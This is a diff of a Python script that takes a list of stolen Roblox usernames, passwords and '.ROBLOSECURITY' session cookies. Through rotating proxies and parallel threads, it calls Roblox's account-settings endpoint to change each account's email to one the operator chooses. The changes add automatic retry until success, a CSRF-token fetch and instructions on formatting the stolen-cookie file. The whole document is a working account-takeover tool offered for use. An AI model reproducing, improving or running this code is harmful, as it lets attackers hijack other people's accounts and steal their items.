@@ -1,35 +1,53 @@
 import requests, threading, random
+from tenacity import retry
 
-with open('proxies.txt', 'r') as proxies:
+# Put your proxies in a proxies.txt file, separated by a new line.
+with open("proxies.txt", "r") as proxies:
     proxies = proxies.read().splitlines()
 
-email = ""
+# Put the email the verifications should go to here.
+email = "example@domain.tld"
 
+# This request will repeat itself on failure until success is achieved (email sent).
+@retry()
 def send(cookie, password):
-    try:
-        with requests.session() as session:
-            session.cookies['.ROBLOSECURITY'] = cookie
-            session.headers['x-csrf-token'] = session.get('https://www.roblox.com/home').content.decode('utf8').split("Roblox.XsrfToken.setToken('")[1].split("');")[0]
-            s = session.post('https://accountsettings.roblox.com/v1/email', data={'password':password, 'emailAddress':email, 'skipVerificationEmail':False}, proxies={'http':random.choice(proxies), 'https':random.choice(proxies)})
-            print(s.content)
-    except:
-        with requests.session() as session:
-            session.cookies['.ROBLOSECURITY'] = cookie
-            session.headers['x-csrf-token'] = session.get('https://www.roblox.com/home').content.decode('utf8').split("Roblox.XsrfToken.setToken('")[1].split("');")[0]
-            s = session.post('https://accountsettings.roblox.com/v1/email', data={'password':password, 'emailAddress':email, 'skipVerificationEmail':False}, proxies=None)
-            print(s.content)
+    with requests.session() as session:
+        session.cookies[".ROBLOSECURITY"] = cookie
+        # A valid CSRF token is required.
+        session.headers["x-csrf-token"] = session.post("https://accountsettings.roblox.com/v1/email").headers["x-csrf-token"]
+        s = session.post(
+            "https://accountsettings.roblox.com/v1/email",
+            data={
+                "password": password,
+                "emailAddress": email,
+                "skipVerificationEmail": False,
+            },
+            # Don't want to use proxies? this line to proxies=None
+            proxies={"http": random.choice(proxies), "https": random.choice(proxies)},
+        )
+        return print(s.content)
 
 
-
-
-with open('combos_cookies.txt') as cookies:
+# Replace combos_cookies.txt with the name of your cookie file, they must be separated by a new line.
+with open("combos_cookies.txt") as cookies:
     cookies = cookies.read().splitlines()
 
+"""
+A cookie file must be formatted as such:
+Username:Password:Cookie
+The cookie should not include ".ROBLOSECURITY=", it should only be:
+"_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_" and the random string that comes after.
+Alternatively you can edit the code below to suit your needs.
+"""
 
-while True:
-    for cc in cookies:
-        user_pass = cc.split('_|')[0]
-        cookie = cc.split('_|')[1] 
-        cookie = '_|' + cookie
-        passw = user_pass.split(':')[1]
-        threading.Thread(target=send,args=(cookie,passw,)).start()
+for cc in cookies:
+    cookie = cc.split("_|")[1]
+    cookie = '_|'  + cookie
+    passw = cc.split(':')[1]
+    threading.Thread(
+        target=send,
+        args=(
+            cookie,
+            passw,
+        ),
+    ).start()
